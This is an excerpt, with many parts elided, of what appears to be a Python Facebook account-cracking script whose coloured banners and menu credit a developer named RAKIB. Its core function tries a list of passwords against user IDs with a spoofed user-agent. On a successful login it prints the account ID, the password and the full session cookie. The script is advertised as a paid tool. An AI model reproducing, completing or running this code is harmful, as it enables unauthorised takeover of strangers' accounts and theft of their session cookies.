...
\x1b[38;5;46m______________________________________________________
 \033[1;31m[\033[1;32m[H]\033[1;31m]\033[1;32m DEVELOPER : RAKIBULLAH
 \033[1;31m[\033[1;32m[R]\033[1;31m]\033[1;32m DEVELOPER : RAKIBULLAH
...
def Main():
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://https://www.facebook.com/md.RAKIB.1428?mibextid=ZbWKwL');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://wa.me/+8801986843047');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[RAKIB]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
           ...
           'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [RAKIB-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[RAKIB💚]=COOKIE : '+coki)
                oks.append(cid)
...
def superuser():
    ...
    if id in DARK:
        ...
        os.system("clear")
        os.system("xdg-open https://www.facebook.com/profile.php?id=100040424541718&mibextid=ZbWKwL")
        time.sleep(3.0)
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am RAKIBVAI er  RO and my boss is RAKIB.Sir this tool is paid because 100% ok id just now login\"")
